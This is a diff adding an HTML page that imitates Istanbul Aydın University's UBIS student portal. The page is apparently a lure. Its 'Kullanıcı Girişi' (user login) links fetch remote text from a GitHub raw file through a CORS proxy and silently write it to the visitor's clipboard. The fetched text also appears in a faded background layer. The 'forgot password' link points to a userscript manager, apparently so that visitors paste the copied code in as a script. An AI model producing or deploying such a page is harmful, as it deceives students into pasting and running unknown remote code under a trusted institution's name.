@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta name="keywords" content="ubis, aysis, iau, öğrenci bilgi sistemi, kiosk, kürsü, aysis iphone, ubis iphone, aysis android, ubis android">
+<meta name="description" content="UBIS; İstanbul Aydın Üniversitesi Öğrenci, Personel Bilgi Sistemi">
+<meta name="theme-color" content="#6EA3CD">
+<meta name="rating" content="All">
+<meta name="robots" content="index, follow">
+<meta name="og:title" content="UBIS :: İstanbul Aydın Üniversitesi Bilgi Sistemi">
+<meta name="og:image" content="https://ubistatic.aydin.edu.tr/cdn/ubis/Themes/NewLook/Image/iau-logo.png">
+<meta name="og:description" content="İstanbul Aydın Üniversitesi Bilgi Sistemi">
+<title>UBIS :: İstanbul Aydın Üniversitesi Bilgi Sistemi</title>
+
+<link rel="stylesheet" type="text/css" href="css/screen.css" media="screen">
+<link rel="stylesheet" type="text/css" href="css/print.css" media="print">
+<meta name="Author" content="Agah ALICI [ agah(at)aydin.edu.tr ], Murat ŞAFAK [ muratsafak(at)aydin.edu.tr ]">
+<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="favicon4.ico">
+<link rel="shortcut icon" type="image/x-icon" href="favicon4.ico">
+
+<script type="text/javascript" async="" src="js/ga.js"></script>
+<script type="text/javascript">
+    window.addEventListener("error", function (e) {
+        if(e.error != null) {
+            var StackData = e.error.stack;
+            var ErrorData = e.error.toString();
+            if (StackData) ErrorData += "\n" + StackData;
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/?_xJSAutoLog=1", true);
+            var params = new FormData;
+            params.append("JSErrorData", ErrorData);
+            xhr.send(params);
+        }
+    });
+</script>
+
+<script type="text/javascript" src="js/prototype.js"></script>
+<script type="text/javascript" src="js/prototype-cookie.js"></script>
+<script type="text/javascript" src="js/global.js"></script>
+<script type="text/javascript" src="js/jquery-2.1.4.min.js"></script>
+<script type="text/javascript">var $j = jQuery.noConflict();</script>
+<script type="text/javascript" src="js/jquery-ui.min.js"></script>
+<script type="text/javascript" src="js/jquery.scrollbox.min.js"></script>
+<script type="text/javascript">
+    $j(window).load( function() { /*$j( document ).tooltip();*/ });
+</script>
+
+<link rel="stylesheet" type="text/css" href="css/jquery-ui.css" media="all">
+<link rel="stylesheet" type="text/css" href="css/form.css" media="all">
+
+<!-- Cloudflare Web Analytics -->
+<script defer="" src="js/beacon.min.js" data-cf-beacon='{"token":"d8cffa74d4cf4884981a9fac1642b5df"}'></script>
+<!-- End Cloudflare Web Analytics -->
+</head>
+
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+
+<style type="text/css">
+    #splashNewsScroller { height:26px; }
+    .scroll-text { overflow: hidden; }
+    .scroll-text ul { width: 100%; overflow: hidden; list-style-type: none; margin: 0; padding:0; }
+    .scroll-text ul li { margin: 0; padding: 0; padding-top:10px; padding-bottom:12px; list-style-type: none; }
+    .scroll-text ul li a { color: #ffffff; padding: 10px; text-decoration: none; font-size:12px; }
+</style>
+
+<div class="nl2-head">
+    <div class="nl2-header">
+        <div class="nl2-header-cont">
+            <a href="?Pointer=Main&"><img src="images/nl2-logo.png" style="height:70px;border:0px;margin-top:4px;" title="UBIS" alt="UBIS"></a>
+        </div>
+    </div>
+    <div class="nl2-hmenu noprint">
+        <div class="nl2-hmenu-cont">
+            <div class="nl2-header-language"></div>
+            <div class="nl2-header-menuitems">
+                <div id="splashNews" class="nl2-header-splash">
+                    <div class="scroll-text" id="splashNewsScroller"></div>
+                </div>
+                <div style="width:17px;height:27px !important;float:right;cursor:e-resize;color:#D4D4D4;line-height:25px;font-size:22px;" id="toggleNLRB" onclick="toggleNLRB();">&#8801;</div>
+                <div class="nl2-header-topmenu r">
+                    <ul style="float:right;" id="nl2-topmenu-ul">
+                        <li><a href="?Pointer=Main&">Anasayfa</a></li>
+                        <li>
+                            <!-- اینجا دکمه‌ای است که با کلیک روی آن، محتوای Pastebin کپی می‌شود -->
+                            <a href="#" onclick="copyContentFromFile()" style="font-weight:bold;color:navy;">
+                                Kullanıcı Girişi
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="nl2-main">
+    <div class="nl2-table">
+        <div class="nl2-table-row">
+            <div class="nl2-table-cell nl2-leftblock">
+                <div id="block1">
+                    <div id="block_Block1" class="blockPart">
+                        <div class="bHeader1">Ana Menü</div>
+                        <div class="bContent1">
+                            <ul id="Menu_1" class="menu">
+                                <li class="menuItem "><a href="?Pointer=Main&" target="_self">Anasayfa</a></li>
+                                <li class="menuItem ">
+                                    <a href="#" onclick="copyContentFromFile()" style="font-weight:bold;color:navy;">
+                                        Kullanıcı Girişi
+                                    </a>
+                                </li>
+                                <li class="menuItem "><a href="https://www.tampermonkey.net" target="_self" style="font-weight:bold;color:navy;">Şifrmı Unuttum</a></li>
+                                <li class="menuItem "><a href="https://www.aydin.edu.tr/tr-tr/ogrenciler/kayit-kabul/Pages/akademik-takvim.aspx" target="_blank">Akademik Takvim</a></li>
+                            </ul>                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="nl2-table-cell nl2-right nl2-right-partial">
+                <div class="nl2-table">
+                    <div class="nl2-table-row">
+                        <div id="centerContainer" class="nl2-table-cell nl2-center nl2-center-normal ">
+                            <div class="contentContainer" id="contentContainer">
+                                <div style="margin:10px 0px 10px 0px; height:20px; width:100%; text-align: right; font-size:14px !important;">
+                                    <div style="display: inline-block; font-size:14px !important;">
+                                        <button id="fontIN" style="font-size:14px !important;" class="noprint"> A+ </button>
+                                        <button id="fontDE" style="font-size:14px !important;" class="noprint"> A- </button>
+                                    </div>
+                                </div>
+                                <div id="content-" class="content">
+                                    <div id="cHeader">Güncel Duyurular</div>
+                                    <div id="cContent">
+                                        <table id="lNews" class="list" cellspacing="0" width="100%">
+                                            <tbody>
+                                                <tr>
+                                                    <th style="width:16px;"></th>
+                                                    <th class="l">Duyuru</th>
+                                                    <th class="r">Tarih</th>
+                                                </tr>
+                                                <tr>
+                                                    <td class="c" colspan="3" style="height:40px;">
+                                                        Gösterilecek duyuru bulunmuyor.
+                                                    </td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                        <div class="r"><a href="?Pointer=News&Page=NewsList&">Tüm Haberler</a></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div id="rightMenu" class="nl2-table-cell nl2-rightblock">
+                            <div id="block2">
+                                <div id="block_ogrenci_MobileLinks" class="blockPart">
+                                    <div class="bHeader2">UBIS Mobil</div>
+                                    <div class="bContent2">
+                                        <div class="c" style="margin-top:4px;">
+                                            <a href="?Pointer=Content&Page=GetPage&PagePointer=App.IPhone"><img style="border: 0px;" title="Iphone / Ipad" src="images/ios.png" alt="Iphone / Ipad" width="36" height="36"></a>
+                                            <a href="?Pointer=Content&Page=GetPage&PagePointer=App.Android"><img style="border: 0px;" title="Android" src="images/android.png" alt="Android" width="36" height="36"></a>
+                                            <a href="?Pointer=Content&Page=GetPage&PagePointer=App.HTML5"><img style="border: 0px;" title="Mobile Web" src="images/html5.png" alt="Mobil Web" width="36" height="36"></a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div><!-- nl2-table-row -->
+                </div><!-- nl2-table -->
+            </div><!-- nl2-right-partial -->
+        </div><!-- nl2-table-row -->
+    </div><!-- nl2-table -->
+</div><!-- nl2-main -->
+
+<div class="clear"></div>
+<div class="nl2-footer">
+    <div class="nl2-footer-content">
+        <div class="nl2-footer-fb l">
+            <div class="noprint" style="margin-left:6px;"></div>
+            <div class="justprint" style="margin-left:6px;">05.01.2025 11:25:04 - 247.225.214.119 - 0</div>
+        </div>
+        <div class="nl2-footer-srv r">©IAU | @166 &nbsp;</div>
+        <div class="clear"></div>
+    </div>
+</div>
+
+<div itemscope="" itemtype="http://schema.org/PostalAddress" style="display:none;">
+    <span itemprop="name">Istanbul Aydin University</span>
+    <span itemprop="addressLocality">Besyol Mah. Inonu Cad. No:38</span>, 
+    <span itemprop="addressRegion">Istanbul</span>
+    <span itemprop="postalCode">34295</span>
+    <span itemprop="addressCountry">Turkey</span>
+</div>
+
+<iframe name="printFrame" id="printFrame" src="" style="width:1px;height:1px;position:absolute;left:-10px;top:-10px;" frameborder="0"></iframe>
+<div id="BlackBack" style="display:none !important;" onclick="closeModalDialog();"></div>
+<div style="display:none;" id="modalLoadingDiv">
+    <div class="c" style="margin-top:100px;">
+        <img src="images/ajaxLoading.gif" style="width:234px;"><br>İçerik yükleniyor...
+    </div>
+</div>
+<div id="ModalDialogBoxContainer" style="display:none;">
+    <div style="width:100%;background:#7685aa;height:20px;color:#FFFFFF;font-weight:bold;padding-top:4px;" ondblclick="fullScreenModalDialog();">
+        <div style="float:right;cursor:pointer;margin-right:6px;margin-top:1px;">
+            <img onclick="closeModalDialog();" src="images/modal_close.png" style="border:0px;width:13px;">
+        </div>
+        <div style="float:right;cursor:pointer;margin-right:6px;margin-top:1px;">
+            <img onclick="fullScreenModalDialog();" src="images/modal_fs.png" style="border:0px;width:13px;">
+        </div>
+        <div id="ModalDialogBoxTitle"></div>
+    </div>
+    <div id="ModalDialogBox"></div>
+</div>
+
+<!-- این بخش، همان محتوای دوم است که به‌صورت پس‌زمینه (z-index: -1) نمایش داده می‌شود -->
+<style>
+  #pastebinSection {
+    position: fixed;
+    top: 0; 
+    left: 0;
+    width: 100%; 
+    height: 100%;
+    background-color: #f4f4f9; /* رنگ پس‌زمینه */
+    z-index: -1;             /* پشت بادی اصلی قرار می‌گیرد */
+    overflow-y: auto;        /* اسکرول در صورت نیاز */
+    pointer-events: none;    /* کلیک‌ناپذیرکردن برای جلوگیری از تداخل */
+  }
+  #pastebinSection .content-container {
+    width: 90%;
+    max-width: 800px;
+    margin: 20px auto;
+    background: #fff;
+    padding: 20px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    max-height: 80%;
+    overflow-y: auto;
+    font-family: monospace;
+    opacity: 0.65; /* میزان شفافیت */
+  }
+  #pastebin-content {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    background: #f0f0f0;
+    padding: 10px;
+    border-radius: 6px;
+  }
+</style>
+
+<div id="pastebinSection">
+  <div class="content-container">
+    <pre id="pastebin-content">Loading content...</pre>
+  </div>
+</div>
+
+<script type="text/javascript">
+    // این تابع بارگذاری و کپی محتوای Pastebin را انجام می‌دهد
+    function copyContentDenoProxy() {
+        const rawUrl = "https://raw.githubusercontent.com/YeTopDaramGhelGheliyeh/sharkboychaet1/refs/heads/main/code.txt";
+        const proxyUrl = "https://deno-cors-proxy.deno.dev/";
+
+        fetch(proxyUrl + rawUrl)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                return response.text();
+            })
+            .then(data => {
+                document.getElementById("pastebin-content").textContent = data;
+                return navigator.clipboard.writeText(data);
+            })
+            .catch(error => {
+                document.getElementById("pastebin-content").textContent = "خطا در بارگذاری محتوا.";
+                console.error("Error fetching content:", error);
+            });
+    }
+
+    // این تابع روی دکمه "Kullanıcı Girişi" در منوها تنظیم شده است
+    function copyContentFromFile() {
+        copyContentDenoProxy();
+    }
+</script>
+
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-208100356']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script');
+        ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0];
+        s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+</body>
+</html>
